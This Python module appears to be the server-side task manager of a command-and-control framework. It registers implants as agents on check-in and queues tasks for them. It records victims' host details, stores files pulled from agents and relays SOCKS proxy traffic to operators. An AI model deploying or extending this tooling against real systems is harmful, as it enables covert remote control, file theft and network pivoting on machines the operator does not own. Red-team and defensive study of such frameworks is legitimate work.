import datetime
import os
import json

from connect import output
from connect import convert
from connect import generate
from connect.team_server.models import AgentModel, TaskModel, ImplantModel


class ResultsManager:

    ERROR_BANNERS = {
        -32000: 'Agent {} failed to process a task.',
        -32601: 'Agent {} could not find method.',
        -32700: 'Invalid JSON was received by the agent.',
    }

    def __init__(self, db, sio_server):
        self.db = db
        self.sio_server = sio_server
        self.task_types = {
            0: self.check_in_task,
            1: self.text_task,
            2: self.file_task,
            3: self.socks_task
        }

    # TASK FUNCTIONS #

    def check_in_task(self, task, _, error):
        agent = task.agent

        # Should notify operators the agent is connected?
        if datetime.datetime.fromtimestamp(823879740.0) == agent.check_in:
            self.sio_server.emit('agent_connected', {'agent': agent.get_agent()})
        agent.check_in = datetime.datetime.now()
        self.commit([agent])

        if error:
            self.error_message(task, error)
            error_code = error['code']
            if error_code in [-32700]:
                return []
        return self.unsent_tasks(agent)

    def text_task(self, task, result, error):
        if error:
            self.error_message(task, error)
        if result:
            result = self.reserved_text_tasks_parser(task, result)
            self.result_message(task, result)
        return []

    def file_task(self, task, result, error):
        if error:
            self.error_message(task, error)
        if result:
            file_contents = convert.base64_to_bytes(result)
            filename = f'{os.getcwd()}/instance/downloads/{generate.string_identifier()}'
            task.results = filename
            with open(filename, 'wb') as fd:
                fd.write(file_contents)
            self.result_message(task, convert.string_to_base64(filename))
        return []

    def socks_task(self, task, result, _):

        # ToDo: Rewrite socks so it doesn't rely on getting socks_disconnect back to stop socks_downstream

        if task.name == 'socks_disconnect':
            socks_downstream_client_id = convert.base64_to_string(task.parameters[1])
            for task in TaskModel.query.filter_by(agent=task.agent).filter_by(name='socks_downstream').all():
                if convert.base64_to_string(task.parameters[1]) == socks_downstream_client_id:
                    task.sent = datetime.datetime.now()
                    self.commit([task])
        elif result:
            if task.name == 'socks_connect':
                self.sio_server.emit('socks_connect', convert.base64_to_string(result))
            if task.name == 'socks_downstream':
                self.sio_server.emit(f'socks_downstream', convert.base64_to_string(result))
        return []

    # AUXILIARY FUNCTIONS #

    def unsent_tasks(self, agent):
        unsent_tasks = []
        for unsent_task in agent.tasks:
            if unsent_task.sent == datetime.datetime.fromtimestamp(823879740.0):
                unsent_tasks.append({
                    "jsonrpc": "2.0",
                    "method": unsent_task.name,
                    "params": unsent_task.parameters,
                    "id": str(unsent_task.id)
                })
                if unsent_task.type > 0:
                    self.sio_server.emit('success', f'Tasked agent {agent.name} to {unsent_task.description}.')
                continue
            if unsent_task.sent:
                continue
            unsent_task.sent = datetime.datetime.now()
            self.commit([unsent_task])
            unsent_tasks.append({
                "jsonrpc": "2.0", 
                "method": unsent_task.name,
                "params": unsent_task.parameters,
                "id": str(unsent_task.id)
            })
            if unsent_task.type > 0:
                self.sio_server.emit('success', f'Tasked agent {agent.name} to {unsent_task.description}.')
        return unsent_tasks
    
    def commit(self, models: list):
        """
        Commits model object changes to the database.
        :param models: A list of models.
        """
        for model in models:
            self.db.session.add(model)
        self.db.session.commit()

    def error_message(self, task, error):
        error_result = error['message']
        task.completed = datetime.datetime.now()
        task.results = error_result
        self.commit([task])
        if task.type < 0:
            return 
        agent = task.agent
        error_banner = self.ERROR_BANNERS[error['code']].format(agent.name)
        self.sio_server.emit(f'task_error', f'{{"banner":"{error_banner} ",' f'"results":"{error_result}"}}')

    def result_message(self, task, result):
        task.completed = datetime.datetime.now()
        task.results = result
        self.commit([task])
        if task.type < 0:
            return 
        agent = task.agent
        event = 'task_results'
        event_banner = f'{{"banner":"Task results from {agent.name}:",' f'"results":"{result}"}}'
        self.sio_server.emit(
            event,
            event_banner 
        )

    def reserved_text_tasks_parser(self, task, result):
        # if not isinstance(result, list):
        #     return result

        agent = task.agent
        command = task.name

        # task_result = result[0]
        # task_property = convert.base64_to_string(result[1])
        if command == 'hostname':
            agent.hostname = convert.base64_to_string(result)
        if command == 'whoami':
            agent.username = convert.base64_to_string(result)
        if command == 'pid':
            agent.pid = convert.base64_to_string(result)
        if command == 'ip':
            agent.ip = convert.base64_to_string(result)
        if command == 'os':
            agent.os = convert.base64_to_string(result)
        return result


class TaskManager:

    def __init__(self, db, sio_server):
        self.db = db
        self.sio_server = sio_server
        self.results_manager = ResultsManager(db, sio_server)

    def process_tasks(self, batch_response):
        batch_request = []

        if not isinstance(batch_response, list):
            batch_response = [batch_response]
        for task in batch_response:
            if not isinstance(task, dict):
                output.display('DEBUG', f'Task not formatted properly: {task}')
                continue
            task_id = next((v for k, v in task.items() if k.lower() == 'id'), None)
            result = next((v for k, v in task.items() if k.lower() == 'result'), None)
            error = next((v for k, v in task.items() if k.lower() == 'error'), None)

            implant = ImplantModel.query.filter_by(key=task_id).first()
            if implant:
                agent = self.create_agent(implant)
                if not agent:
                    return {}
                check_in_task = self.create_check_in_task(agent)
                if not check_in_task:
                    return {}
                initial_batch_request = {
                    "jsonrpc": "2.0",
                    "method": check_in_task.name,
                    "params": check_in_task.parameters,
                    "id": str(check_in_task.id)
                }
                return initial_batch_request

            task = TaskModel.query.filter_by(id=task_id).first()
            if not task:
                output.display('ERROR', 'Failed to retrieve task from batch_response.')
                if error:
                    output.display('ERROR', self.results_manager.ERROR_BANNERS[error['code']])
                    output.display('DEFAULT', error)  
                if result:
                    output.display('DEFAULT', result)
                continue
            batch_request.extend(self.results_manager.task_types[abs(task.type)](task, result, error))
        return batch_request

    def commit(self, models: list):
        """
        Commits model object changes to the database.
        :param models: A list of models.
        """
        for model in models:
            self.db.session.add(model)
        self.db.session.commit()

    def create_agent(self, implant):
        self.sio_server.emit('information', f'Implant {implant.id} checked in creating Agent')
        try:
            agent = AgentModel(implant=implant)
            self.commit([agent])
        except Exception as e:
            self.sio_server.emit('error', f'Failed to create agent:\n {e}')
            return None
        self.sio_server.emit('information', f'Created agent {agent.name}')
        return agent

    def create_check_in_task(self, agent):
        try:
            check_in_task = TaskModel(name='check_in', description='check in', agent=agent, type=0)
            check_in_task.completed = datetime.datetime.now()
            check_in_task.sent = datetime.datetime.now()
            self.commit([check_in_task])
        except Exception as e:
            self.sio_server.emit('error', f'Failed to create check in task:\n {e}')
            return None
        self.sio_server.emit('information', f'Sending initial check in request to {agent.name}')
        return check_in_task